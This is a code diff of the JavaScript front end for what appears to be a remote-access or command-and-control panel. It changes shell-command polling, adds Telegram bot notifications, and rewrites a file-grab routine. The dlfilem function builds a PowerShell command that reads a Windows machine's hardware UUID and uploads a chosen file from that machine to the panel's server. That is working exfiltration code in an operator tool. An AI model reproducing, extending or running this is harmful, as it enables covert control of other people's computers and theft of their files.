@@ -194,13 +194,19 @@ function shell_exec() {
 function shell_exec_res() {
   var uuid = window.location.href.split("#")[1];
   var cmd_uid = localStorage.getItem("cmd_uid");
-
+  
   if (cmd_uid == null) {
     $("#shell_res").html("First Send Command");
   } else {
+    if($('#check_notification_status').prop('checked')){
+      var notification = 1;
+    }else{
+      var notification = 0;
+
+    }
     $.post(
       BASE_URL,
-      { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
+      { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token,notification:notification },
       function (data) {
         $("#shell_res").html(data.trim());
       }
@@ -1359,7 +1365,7 @@ function dlfilem(e){
   var file_name = $(e).attr("name");
   var full_name = $(e).attr("fullname");
   var DirectoryName = $(e).attr("DirectoryName");
-  var cmd=`$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID;$user="${DirectoryName}\\$UID@@@${file_name}";Rename-Item -Path ${full_name} -NewName $user -Force;$wc = New-Object System.Net.WebClient;$resp = $wc.UploadFile('${window.location.href.split('/panel')[0]}/', $user);Rename-Item -Path $user -NewName ${file_name} -Force;return "$UID/${file_name}"`
+  var cmd=`$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID;$file="${DirectoryName}\\${file_name}";$wc = New-Object System.Net.WebClient;$resp = $wc.UploadFile("${window.location.href.split('/panel')[0]}/?upload&uuid=$UID", $file);return "$UID/${file_name}"`
 
   $.post(
     BASE_URL,
@@ -1371,7 +1377,7 @@ function dlfilem(e){
 
   var Interval=setInterval(() => {
     get_dlfilem()
-  }, 500);
+  }, 1500);
   localStorage.setItem("Interval", Interval);
 
   
@@ -1532,8 +1538,29 @@ function get_upload_status() {
 
 
 
-
-
+function check_notification_status(e){
+  e.preventDefault
+  $.post(BASE_URL, { notification: true, token: token}, function (data) {
+    if(data.trim()=="ko"){
+      
+      swal({
+        title: "Oops...",
+        text: "Bot Token or UserID Not Set",
+        icon: "error",
+        dangerMode: true,
+      });
+      $('#check_notification_status').prop('checked', false);
+    }
+  })
+}
+function get_bot_data(){
+  $.post(BASE_URL, { get_notification_data: true, token: token}, function (data) {
+      var break_data=data.trim().split("@@")
+      $("#userid_telegram").val(break_data[0])
+      $("#token_telegram").val(break_data[1])
+      
+  })
+}
 
 
 // end function
